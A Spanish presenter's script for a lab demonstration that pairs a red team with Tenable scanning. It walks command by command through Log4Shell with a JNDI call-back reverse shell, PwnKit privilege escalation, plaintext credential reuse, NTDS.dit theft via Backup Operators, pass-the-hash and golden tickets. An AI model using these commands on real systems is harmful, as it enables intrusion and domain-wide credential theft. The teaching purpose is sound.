# Bifrost — Guion de ataque (comando a comando)

Guía exclusiva del **lado atacante**, pensada para estudiar y para el escenario:
qué es cada servicio, qué hace cada comando y qué decir para que **las dos partes
de la mesa queden bien** — el equipo de Tenable y el equipo de red team.

> **Punto de partida.** El atacante (tu host ParrotOS) solo conoce una cosa: hay
> un servicio en `10.10.0.20:8983`. No tiene credenciales, no ve el dominio, no
> ve nada más. Tenable, en cambio, ya escaneó todo y tiene el reporte. La charla
> es el contraste entre **encontrar** (escala, cobertura, priorización) y
> **demostrar** (explotación, cadena, impacto).

---

## 0. Setup del atacante

```bash
source ~/bifrost/env.sh     # carga las variables del laboratorio
cd ~/bifrost
```

| Comando / variable | Qué hace |
|---|---|
| `source ~/bifrost/env.sh` | ejecuta el archivo *en la shell actual* (no en un subshell), así exporta `LHOST`, `TARGET_*`, credenciales y puertos a tu sesión. |
| `cd ~/bifrost` | te sitúa en la raíz del repo (los scripts buscan `config/lab.env` subiendo directorios). |

| Var | Valor | Qué es |
|---|---|---|
| `LHOST` | `10.10.0.66` | tu host (atacante) en VMnet1 |
| `TARGET_WEB` | `10.10.0.20` | web01 (Solr) |
| `TARGET_DC` | `10.10.0.30` | dc01 (AD + ADCS) |
| `BIFROST_DOMAIN` | `corp.local` | dominio |
| `BIFROST_SOLR_PORT` / `LDAP_PORT` / `HTTP_PORT` / `REVSHELL_PORT` | `8983` / `1389` / `8000` / `4444` | puertos del laboratorio |

---

## 1. El servicio expuesto: Apache Solr

**Qué es.** Solr es un **motor de búsqueda empresarial** basado en Lucene. Se
despliega como un servicio web que expone una **API REST de administración** en
el puerto `8983` (`/solr/admin/...`, `/solr/<core>/...`). Internamente usa
**Log4j2** como biblioteca de *logging* y registra los parámetros que recibe en
las peticiones. Esa combinación —API HTTP de administración + Log4j2— es la que
convierte a Solr en un objetivo clásico de **Log4Shell**.

**Qué es Log4Shell.** Es la vulnerabilidad **CVE-2021-44228** de Log4j2: cuando
la biblioteca registra un texto que contiene una *lookup* JNDI como
`${jndi:ldap://servidor/x}`, **resuelve** esa expresión consultando el servidor
LDAP indicado y **carga y ejecuta** la clase Java que ese servidor le devuelva.
En la práctica: si controlas el servidor LDAP, controlas qué código corre el
objetivo.

**Qué es JNDI.** *Java Naming and Directory Interface*: el mecanismo de Java para
referenciar objetos por nombre a través de LDAP/RMI. El servidor LDAP devuelve
una **referencia** (`javaCodebase`) a una clase; el JVM del objetivo la descarga,
la instancia y ejecuta su bloque estático.

### Reconocimiento

**Lógica del atacante:** no conoces la red; escaneas el único host del alcance y
ves qué contesta.

```bash
nmap -sV -p 8983 "$TARGET_WEB"
```

| Parámetro | Qué hace |
|---|---|
| `-sV` | *version detection*: además de ver el puerto abierto, identifica el servicio y su versión. |
| `-p 8983` | limita el barrido a ese puerto (rapidez; el alcance es uno). |
| `"$TARGET_WEB"` | el host objetivo (`10.10.0.20`). |

```
PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr
```

Ya sabes que es Solr. Pregunta la versión concreta:

```bash
curl -s "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/info/system?wt=json" | grep solr-spec-version
```

| Parámetro | Qué hace |
|---|---|
| `-s` | modo silencioso: sin barra de progreso ni mensajes de error a stdout. |
| `/solr/admin/info/system` | endpoint de administración que devuelve información del nodo. |
| `?wt=json` | *writer type*: pide la respuesta en JSON (en vez del formato por defecto). |
| `grep solr-spec-version` | filtra la línea que interesa. |

```json
"solr-spec-version":"8.11.0"
```

> **Speech (los dos lados):**
> **Red team:** *"No sabía nada de esta red. Escaneo el puerto, veo Solr, y la
> versión 8.11.0 me dice que hay Log4j2 vulnerable."*
> **Tenable:** *"Y sin que nadie le dijera dónde mirar: el barrido del escáner
> descubre el 8983 y el plugin de Log4Shell lo marca Crítico (CVSS 10.0) por la
> respuesta HTTP. Eso es cobertura: el operador tuvo que apuntar un host; el
> escáner cubrió toda la red."*

**Contraste con Nessus:** dos caminos a la misma puerta. El escáner llega por
inventario y detección pasiva; el atacante llega por suposición + confirmación de
versión. El escáner da **cobertura**; el atacante, **certeza explotable**.

---

## 2. Puente 1 — Log4Shell → shell

### Cómo lo encuentra el atacante

Versión `8.11.0` + Log4j2 ⇒ candidato a CVE-2021-44228. El atacante monta la
infraestructura JNDI (un servidor LDAP que devuelve su clase) y dispara la
*lookup* contra un endpoint que **loguea** el parámetro. Solr expone
`/solr/admin/cores`, que procesa y registra el parámetro `action`.

### Los tres comandos

**Terminal 1** — compila el payload y levanta los servidores:

```bash
cd ~/bifrost/exploits/log4shell
./build.sh          # compila Exploit.class (reverse shell a $LHOST:4444)
./ldap-serve.sh     # HTTP:8000 sirviendo el .class + LDAP:1389 de marshalsec
```

| Comando | Qué hace |
|---|---|
| `./build.sh` | compila `Exploit.java` → `Exploit.class`: una clase cuyo bloque estático abre una reverse shell hacia `10.10.0.66:4444`. |
| `./ldap-serve.sh` | levanta dos servicios: un `python -m http.server` en `8000` que *sirve* el `.class`, y **marshalsec** (servidor LDAP) en `1389` que devuelve la referencia a ese `.class`. |

**Terminal 2** — el listener que recibirá la shell:

```bash
nc -lvnp "$BIFROST_REVSHELL_PORT"
```

| Parámetro | Qué hace |
|---|---|
| `-l` | *listen*: ponerse a escuchar en vez de conectar. |
| `-v` | *verbose*: muestra la conexión. |
| `-n` | no resuelve DNS (IPs directas). |
| `-p 4444` | puerto local de escucha (debe coincidir con el del payload). |

**Terminal 3** — el disparo:

```bash
curl -g "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
```

| Parámetro | Qué hace |
|---|---|
| `-g` | *globoff*: **no** interpretar `{}` como patrón glob. Sin esto, curl se come las llaves y Log4j nunca ve la *lookup*. |
| `action=${jndi:ldap://...}` | el valor que Solr registra; al loguearlo, Log4j resuelve la *lookup* y pide la clase a tu LDAP. |
| `/Exploit` | nombre del recurso LDAP que marshalsec mapea a tu `Exploit.class`. |

La shell aparece en la terminal 2, como el usuario del servicio Solr:

```bash
id        # uid=... (solr): usuario de servicio, sin privilegios
hostname  # web01
```

> **Speech (los dos lados):**
> **Red team:** *"Un `curl`. Eso es el acceso inicial: el hallazgo crítico no era
> ruido, era una puerta."*
> **Tenable:** *"Y este es el valor del hallazgo sin credenciales: el escáner lo
> encontró **antes** de que existiera un usuario. Nos dice qué está expuesto;
> el red team nos dice qué pasa cuando alguien lo toca."*

**Contraste con Nessus:** el plugin detecta la versión vulnerable **sin
credenciales**, por inspección HTTP. El atacante tuvo que montar LDAP y disparar.
Ahí está la frontera: el escáner **identifica la condición**; el red team
**convierte la condición en acceso**.

---

## 3. Puente 2 — Privesc: credenciales + PwnKit → root

### El servicio y la vulnerabilidad

**Qué es PwnKit.** Es la vulnerabilidad **CVE-2021-4034** de `polkit`, la
biblioteca de autorización de Linux. El binario `pkexec` (SUID root) maneja mal
`argc/argv`, permite corromper memoria y ejecutar código **como root**. Cualquier
usuario sin privilegios puede dispararla — pero necesita **`argc=0`**, que los
kernels modernos (≥ `5.4.0-124`) mitigan. Por eso `web01` arranca el kernel del
release (`5.4.0-26`).

### Cómo lo encuentra el atacante

Como `solr` (usuario de servicio, sin privilegios) no llegas a root. El primer
instinto es **buscar credenciales** en archivos de configuración del servicio.

```bash
cat /opt/solr/server/solr/intranet/conf/db.properties
```

| Comando | Qué hace |
|---|---|
| `cat` | muestra el contenido del archivo (lectura directa). |
| `.../conf/db.properties` | configuración del *core* de Solr: aquí hay credenciales de una app interna. |

```
db.user=svc_app
db.password=Bifrost2026!
```

Hay un usuario local `svc_app`. Cambias a él:

```bash
su svc_app      # pide la contraseña: Bifrost2026!
```

| Comando | Qué hace |
|---|---|
| `su svc_app` | *switch user*: inicia una shell como `svc_app` (pide su contraseña). |

Ya como `svc_app`, escalas. El exploit quedó **precompilado en `/opt/pk`**
durante la construcción (web01 no tiene internet en la demo):

```bash
cd /opt/pk && ./cve-2021-4034
id
```

| Comando | Qué hace |
|---|---|
| `cd /opt/pk` | entra donde está el PoC precompilado. |
| `./cve-2021-4034` | ejecuta el PoC de PwnKit: abusa de `pkexec` para lanzar una shell root. |
| `id` | confirma que eres `uid=0(root)`. |

```
uid=0(root) gid=0(root)
```

> **Speech (los dos lados):**
> **Red team:** *"Con `solr` no llegaba a root; con una credencial que estaba en
> un archivo, sí. Eso es trabajo de cadena: lo que un hallazgo suelto no dice, la
> cadena lo construye."*
> **Tenable:** *"Y PwnKit es el mejor argumento de por qué el escaneo
> **autenticado** no es opcional: sin credenciales el escáner nunca ve el kernel
> ni `policykit`. El red team encontró esa credencial en la config; el escáner
> la habría usado para ver la casa entera."*

**Detalle técnico (para el ensayo):** verifica el kernel antes.

```bash
uname -r    # debe decir 5.4.0-26-generic
```

Si no precompilaste `/opt/pk` y la VM todavía tuviera red, el fallback es
`git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034`.

**Contraste con Nessus:** PwnKit solo aparece en el escaneo **con credenciales**
(checks locales de `policykit`). Este puente es literalmente la demostración de
que "el escáner ve más con credenciales", y de que "el red team consigue esas
credenciales". Cada equipo pone la mitad.

---

## 4. Puente 3 — Credenciales de dominio (`svc_backup`)

### La credencial

**Qué es.** `svc_backup` es una cuenta de **servicio de dominio** (no local) cuyo
propósito es ejecutar copias de seguridad. En el laboratorio viaja en claro en la
configuración de la app interna de `web01`.

### Cómo lo encuentra el atacante

Root en `web01` = leer cualquier archivo. El *deploy* en `/opt/app` tiene las
credenciales de dominio en claro:

```bash
cat /opt/app/config.yml
```

```
domain:
  realm: CORP.LOCAL
  bind_user: svc_backup
  bind_password: "Verano2024!"
```

De vuelta en tu host, **valida** la credencial contra el DC:

```bash
nxc smb "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"
```

| Parámetro | Qué hace |
|---|---|
| `nxc` | *netexec* (sucesor de `crackmapexec`): ejecución de módulos de red. |
| `smb` | protocolo a usar (SMB, puerto 445). |
| `-u` / `-p` | usuario y contraseña de dominio (`svc_backup` / `Verano2024!`). |
| `$TARGET_DC` | el DC (`10.10.0.30`); `[+]` confirma que la credencial es válida. |

`svc_backup` **no** es administrador de nada: es un usuario de dominio normal. El
valor del puente es que la credencial es **válida** y que en el DC está en
`Backup Operators` y `Remote Desktop Users` (el siguiente puente).

> **Speech (los dos lados):**
> **Red team:** *"Root en una máquina no es el objetivo; el objetivo es el
> dominio. La cuenta de copias viajaba en texto plano. No me da una shell, pero me
> da una credencial de dominio válida, y eso es la llave del siguiente salto."*
> **Tenable:** *"Y el escáner ya lo había marcado como riesgo: credencial en un
> archivo, *share* con permisos amplios, servicios expuestos. El red team puso
> nombre y apellido: esta cuenta, este dominio, este salto."*

**Contraste con Nessus:** aquí el reporte mostraba hallazgos "medios" dispersos
—SMB signing no requerido, permisos amplios en un share, credencial expuesta—.
**Ninguno es crítico por separado.** La cadena los une. El escáner **prioriza**
qué arreglar primero; el red team **demuestra** por qué ese orden importa.

---

## 5. Puente 4 — Backup Operators + NTDS.dit → Domain Admin

### Los servicios y la vulnerabilidad

**Qué es Backup Operators.** Es un grupo **Builtin** de Windows cuyo propósito
legítimo es hacer copias de seguridad: sus miembros reciben los privilegios
**`SeBackupPrivilege`** y **`SeRestorePrivilege`**. En un DC, ese grupo puede
iniciar sesión localmente y leer archivos que el propio administrador no puede
abrir con una copia normal.

**Qué es `SeBackupPrivilege`.** Es el privilegio "Back up files and directories":
permite abrir cualquier archivo **ignorando las ACLs** y los bloqueos. El
`NTDS.dit` está abierto por el servicio `NTDS`, así que sin este privilegio no se
puede copiar en caliente. Ojo: `robocopy /b` **habilita** el privilegio por sí
mismo; `reg save` **no**, y con `svc_backup` da `Access is denied`.

**Qué es `NTDS.dit`.** Es la **base de datos de Active Directory**
(`C:\Windows\NTDS\ntds.dit`): contiene todos los objetos del dominio, incluidos
los **hashes** de las cuentas. El hive **`SYSTEM`**
(`C:\Windows\System32\config\SYSTEM`) guarda la clave de arranque (`BootKey`) con
la que se cifran esos hashes.

**Qué es `diskshadow`.** Es la herramienta de **Volume Shadow Copy (VSS)** de
Windows. Crea una **sombra** del volumen y la expone como otra letra (`Z:`), de
modo que se puede copiar el `NTDS.dit` **sin detener AD** y sin que el archivo
esté bloqueado.

**Qué es DCSync / `krbtgt`.** La **API de replicación** (DRSUAPI) permite a un DC
pedir a otro los hashes de las cuentas. El hash de **`krbtgt`** firma los TGT: con
él se forjan **golden tickets**. Pero aquí no hace falta DCSync en línea: el
`NTDS.dit` copiado ya trae **todos** los hashes, `krbtgt` incluido.

### Cómo lo encuentra el atacante

El `svc_backup` es un usuario de dominio **normal** (solo `Domain Users`), pero en
el DC está en dos grupos Builtin que el laboratorio deja así a propósito:

- **`Backup Operators`** → `SeBackupPrivilege`: puede copiar el `NTDS.dit`.
- **`Remote Desktop Users`** → puede iniciar sesión por **RDP** en el DC.

El atacante no "rompe" nada: **usa la combinación**. El `SeBackupPrivilege` le
deja leer la base de AD; el RDP le da el escritorio para ejecutar `diskshadow` y
`robocopy /b`.

**Terminal 1 — RDP al DC como `svc_backup`:**

```bash
xfreerdp3 /v:"$TARGET_DC" /u:'svc_backup' /d:'corp.local' /p:'Verano2024!' /cert:ignore /sec:nla \
  /drive:loot,/home/bard/bifrost/loot
```

| Parámetro | Qué hace |
|---|---|
| `/v:$TARGET_DC` | host al que conectarse (el DC, `10.10.0.30`). |
| `/u:'svc_backup'` | usuario de dominio, **sin `CORP\`** (así no intenta Kerberos con realm `CORP`). |
| `/d:'corp.local'` | dominio; evita el `Cannot find KDC for realm "CORP"`. |
| `/p:'Verano2024!'` | su contraseña (la del `config.yml` de `web01`). |
| `/cert:ignore` | acepta el certificado autofirmado del DC (lab). |
| `/sec:nla` | el DC exige **NLA** (`HYBRID_REQUIRED_BY_SERVER`); con `/sec:tls` falla. |

**En el DC — `diskshadow` interactivo (el que funciona):**

```powershell
diskshadow
set context persistent nowriters
add volume c: alias ntds
create
expose %ntds% z:
exit
```

| Línea | Qué hace |
|---|---|
| `set context persistent nowriters` | contexto VSS persistente y sin escritores (no toca el servicio de AD). |
| `add volume c: alias ntds` | añade el volumen `C:` con el alias `ntds`. |
| `create` | crea la sombra. |
| `expose %ntds% z:` | monta la sombra como `Z:`. |
| `exit` | sale de `diskshadow`. |

> Si `expose` dice `The drive letter is already in use`, la sombra anterior
> sigue montada en `Z:`: `unexpose z:` (o monta la nueva en `y:`) y vuelve a
> exponer. Si prefieres un `ds.txt`, escríbelo con `Set-Content` y **un solo
> `%ntds%`**: con `cmd /c echo` el `%ntds%` se expande antes de que `diskshadow`
> defina el alias; con `%%ntds%%` busca el alias `%%ntds%%` y falla. Con
> `Out-File`/here-string el `nowriters` puede llegar como `nowriter` y
> `diskshadow` imprime la ayuda **sin crear `Z:`**.

**Copiar `NTDS.dit` y `SYSTEM` con `/b`:**

```powershell
robocopy /b z:\Windows\NTDS C:\Users\svc_backup ntds.dit
robocopy /b z:\Windows\System32\config C:\Users\svc_backup SYSTEM
```

| Parámetro | Qué hace |
|---|---|
| `/b` | modo **backup**: habilita `SeBackupPrivilege` y salta ACLs y bloqueos. |
| `z:\Windows\NTDS` | la sombra del volumen (la base de AD). |
| `ntds.dit` | el archivo que se copia. |
| `C:\Users\svc_backup` | perfil de `svc_backup`: escribe ahí sin los problemas de ACL de `C:\Windows\Temp`. |
| `z:\Windows\System32\config` | la sombra del hive `SYSTEM` (la `BootKey`). |

> `robocopy /b` funciona con `svc_backup` porque **habilita** el privilegio.
> `reg save HKLM\SYSTEM` **no** lo hace y da `Access is denied`; como
> `Administrator` sí funciona.

**Exfiltrar al host como `svc_backup` (sin `Administrator`):**

Con la unidad redirigida (`/drive:loot,...`), `\\tsclient\loot` es el `loot` del
host:

```powershell
copy C:\Users\svc_backup\ntds.dit \\tsclient\loot\ntds.dit
copy C:\Users\svc_backup\SYSTEM  \\tsclient\loot\SYSTEM
```

> **Antes**, en el host: `chmod 777 /home/bard/bifrost/loot`. El `svc_backup`
> llega por el canal RDP como otro usuario y necesita escritura en el `loot`.

> Alternativa sin RDP: en el host
> `impacket-smbserver loot /home/bard/bifrost/loot -smb2support -username svc -password 'Verano2024!'`.
> Sin `-username/-password` el DC rechaza el **guest**
> (`... security policies block unauthenticated guest access`). Desde el DC, como
> `svc_backup`, `copy C:\Users\svc_backup\ntds.dit \\10.10.0.66\loot\ntds.dit`
> y lo mismo con `SYSTEM`.

**Volcar los hashes (hacen falta los DOS archivos):**

```bash
impacket-secretsdump -ntds /home/bard/bifrost/loot/ntds.dit \
  -system /home/bard/bifrost/loot/SYSTEM LOCAL
```

| Parámetro | Qué hace |
|---|---|
| `-ntds` | el `ntds.dit` copiado. |
| `-system` | el hive `SYSTEM` (contiene la `BootKey`). |
| `LOCAL` | modo offline: no contacta al DC. |

> Sin `SYSTEM` no hay `BootKey` y `secretsdump` falla con
> `No such file or directory: 'SYSTEM'`. Es el error típico si solo copiaste el
> `ntds.dit`.

La salida trae `Administrator:500:...` y `krbtgt:502:...`. Con el hash del
`Administrator` cierras:

```bash
impacket-psexec -hashes :<HASH_ADMIN> 'corp.local/Administrator@'"$TARGET_DC"
type C:\Corp\Finanzas\Q4_Forecast_2026.txt
```

| Parámetro | Qué hace |
|---|---|
| `-hashes :NTLM` | *pass-the-hash* con el hash del `Administrator` (sin contraseña). |
| `corp.local/Administrator@DC` | identidad y destino. |
| `type ...` | lee el archivo de negocio (impacto controlado). |

**Golden Ticket (opcional, con el `krbtgt`):**

```bash
impacket-ticketer -nthash <HASH_KRBTGT> \
  -domain-sid S-1-5-21-3110217645-1558988347-1089824859 \
  -domain corp.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass 'corp.local/Administrator@DC01.corp.local'
```

| Parámetro | Qué hace |
|---|---|
| `-nthash` | hash del `krbtgt`. |
| `-domain-sid` | SID del dominio (de `Get-ADDomain` o `whoami /user`). |
| `-domain` | dominio. |
| `KRB5CCNAME` | el *ccache* del ticket forjado. |
| `-k -no-pass` | usa Kerberos sin contraseña. |

> **Speech (los dos lados):**
> **Red team:** *"No soy administrador: soy un usuario de backup. Pero el
> `SeBackupPrivilege` me deja leer la base de datos del dominio, y el RDP me da
> el escritorio para hacerlo. Con `NTDS.dit` y `SYSTEM` tengo el `krbtgt`: el
> dominio entero."*
> **Tenable:** *"Y ese es el punto: dos grupos Builtin que por separado parecen
> inocuos —'copias de seguridad' y 'escritorio remoto'— juntos son la ruta
> `svc_backup → Backup Operators → DC → NTDS.dit → Domain Admin`. El escáner la
> modela como Attack Path; el red team la ejecuta."*

**Contraste con Nessus:** el escáner puede ver el `SeBackupPrivilege` como
configuración de riesgo y el `Remote Desktop Users` como superficie de acceso.
Ninguno es un 10.0 por separado; la cadena sí. El escáner **predice la ruta**; el
red team **demuestra que el `svc_backup` llega al `krbtgt`**.

---

## 6. Impacto controlado

```bash
# dentro de la shell en dc01
type C:\Corp\Finanzas\Q4_Forecast_2026.txt
```

| Comando | Qué hace |
|---|---|
| `type` | muestra el contenido de un archivo (equivalente a `cat` en Windows). |

Lee una línea y **para**. Nada de cifrar, borrar ni exfiltrar.

> **Speech (los dos lados):**
> **Red team:** *"El impacto se demuestra leyendo un archivo. No hace falta nada
> más, y no vamos a hacerlo."*
> **Tenable:** *"Y ese archivo es la prueba de que el riesgo era real: no es un
> puntaje, es un dato de negocio en manos de quien no debería tenerlo."*

---

## 7. Limpieza (volver al estado previo al ataque)

El ataque deja rastros en el DC (sombra, `ntds.dit`/`SYSTEM`, `ds.txt`, `.cab`)
y en el host (`loot`, `smbserver`, sesión RDP). Esto los quita y deja el
laboratorio como **antes de comenzar el ataque**: se conserva la configuración
vulnerable del lab (`svc_backup` en `Backup Operators`/`Remote Desktop Users`,
RDP y `SeRemoteInteractiveLogonRight`) para poder repetirlo.

### En dc01 (RDP como `svc_backup` o `Administrator`)

```powershell
diskshadow
unexpose z:
delete shadows all
exit
```

> Si `unexpose` dice que `z:` no existe, revisa con `list shadows`; el
> `delete shadows all` borra todas las sombras del lab.

```powershell
Remove-Item C:\Users\svc_backup\ntds.dit,C:\Users\svc_backup\SYSTEM -Force -ErrorAction SilentlyContinue
Remove-Item C:\Users\svc_backup\*.cab -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM,C:\Windows\Temp\ds.txt -Force -ErrorAction SilentlyContinue
```

Si usaste `psexec` para el impacto, quita su servicio:

```powershell
sc.exe stop PSEXESVC
sc.exe delete PSEXESVC
Remove-Item C:\Windows\PSEXESVC.exe -Force -ErrorAction SilentlyContinue
```

Verifica:

```powershell
Get-PSDrive Z -ErrorAction SilentlyContinue     # no debe existir
Test-Path C:\Users\svc_backup\ntds.dit          # False
Test-Path C:\Users\svc_backup\SYSTEM            # False
```

### En el host

```bash
rm -f /home/bard/bifrost/loot/ntds.dit /home/bard/bifrost/loot/SYSTEM
rm -f /home/bard/bifrost/loot/*.pfx /home/bard/bifrost/loot/*.ccache 2>/dev/null
chmod 775 /home/bard/bifrost/loot

pkill -f xfreerdp3 2>/dev/null
sudo pkill -f impacket-smbserver 2>/dev/null

ls -la /home/bard/bifrost/loot/     # solo PetitPotam (y lo que ya existiera)
```

### Opcional: desmontar también la configuración del lab

Si quieres volver al estado **anterior a construir la vulnerabilidad** (no solo al
previo al ataque), en dc01 como `Administrator`:

```powershell
Remove-ADGroupMember -Identity 'Backup Operators' -Members svc_backup -Confirm:$false
Remove-ADGroupMember -Identity 'Remote Desktop Users' -Members svc_backup -Confirm:$false
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1
# y quitar CORP\svc_backup de "Allow log on through Remote Desktop Services"
# en la Default Domain Controllers Policy (gpmc.msc), luego:
gpupdate /force
```

---

## 8. Timeline del speech (30 min)

| Min | Momento | Frase clave (equilibrada) |
|---|---|---|
| 00:00 | Hook | *"¿Cuál de los 47 críticos me da el dominio?"* |
| 03:00 | El qué (Tenable) | *"el producto dice que la ruta existe; cubre lo que un humano no alcanza a barrer"* |
| 08:00 | Puente 1 | *"un `curl`: el hallazgo sin credenciales se vuelve acceso"* |
| 12:00 | Puente 2 | *"sin credenciales veo la puerta; con ellas, la casa"* |
| 15:00 | Puente 3 | *"la credencial viajaba en texto plano; el reporte ya lo marcaba"* |
| 19:00 | Puente 4 | *"dos grupos Builtin y un RDP: el dominio entero"* |
| 24:00 | Impacto | *"se demuestra leyendo"* |
| 26:00 | Blue team | *"cada puente dejó su firma en los logs"* |

---

## 9. Cierre (el speech que deja bien a los dos)

> **Red team:** *"El escáner responde '¿qué está roto y por dónde empiezo?'.
> Nosotros respondemos '¿cuánto duele?'. Sin el escáner, priorizamos a ciegas;
> sin nosotros, el reporte es una lista de tareas sin impacto."*
>
> **Tenable:** *"Y sin cobertura, el red team solo ve el host que alcanza a
> tocar. La combinación —visibilidad priorizada + validación de explotabilidad—
> es lo que convierte un reporte en una decisión."*

---

## Anexo — atajos por si te quedas en blanco

```bash
source ~/bifrost/env.sh                            # recargar variables
cd ~/bifrost/exploits/log4shell && ./selftest.sh   # ¿el puente 1 sigue vivo?
uname -r                                           # kernel correcto para PwnKit
nxc rdp "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # ¿el RDP de svc_backup sigue?
```

**Frase comodín** (ensáyala):

> *"Esto es exactamente lo que pasa en producción: el exploit no siempre funciona
> a la primera. Se cambia de técnica y se sigue."*
